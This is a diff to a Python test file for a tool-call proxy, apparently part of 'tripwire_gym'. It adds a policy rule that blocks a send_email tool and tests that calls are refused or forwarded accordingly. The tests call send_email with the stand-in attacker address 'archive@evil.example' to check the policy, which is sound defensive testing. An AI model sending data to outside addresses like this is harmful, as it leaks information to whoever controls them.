@@ -176,10 +176,16 @@ def test_a_malformed_scenario_exits_with_a_message_not_a_traceback(tmp_path):
 MOCK_CMD = f"{shlex.quote(sys.executable)} -m tripwire_gym.mock_server {shlex.quote(str(SCENARIO))}"
 
 
-def through_proxy(tmp_path, calls, enforce=True):
+def through_proxy(tmp_path, calls, enforce=True, block_send=True):
     policy = tmp_path / "policy.yaml"
     mode = "" if enforce else "enforce: false\n"
-    policy.write_text(f"version: 1\n{mode}defaults: {{unknown_tools: allow}}\n")
+    send = 'block, reason: "no outbound mail"' if block_send else "allow"
+    policy.write_text(
+        f"version: 1\n{mode}"
+        "defaults: {unknown_tools: allow}\n"
+        "tools:\n"
+        f"  send_email: {{action: {send}}}\n"
+    )
     upstream = f"/usr/bin/env TRIPWIRE_GYM_CALLS={shlex.quote(str(calls))} {MOCK_CMD}"
     return StdioServerParameters(
         command=sys.executable,
@@ -206,7 +212,7 @@ async def test_the_toolbox_is_re_advertised_through_the_proxy(tmp_path, calls):
 
 
 async def test_refused_calls_never_reach_the_toolbox(tmp_path, calls):
-    # the policy engine is still stubbed, so everything fails closed
+    # policy blocks send_email outright
     async with connected(through_proxy(tmp_path, calls)) as session:
         result = await session.call_tool("send_email", {"to": "archive@evil.example"})
 
@@ -218,7 +224,7 @@ async def test_refused_calls_never_reach_the_toolbox(tmp_path, calls):
 async def test_a_forwarded_call_does_reach_the_toolbox(tmp_path, calls):
     # the other half of the test above: without this, an empty calls file
     # would prove nothing about refusals
-    async with connected(through_proxy(tmp_path, calls, enforce=False)) as session:
+    async with connected(through_proxy(tmp_path, calls, block_send=False)) as session:
         result = await session.call_tool("send_email", {"to": "archive@evil.example"})
 
     assert result.content[0].text == "sent"
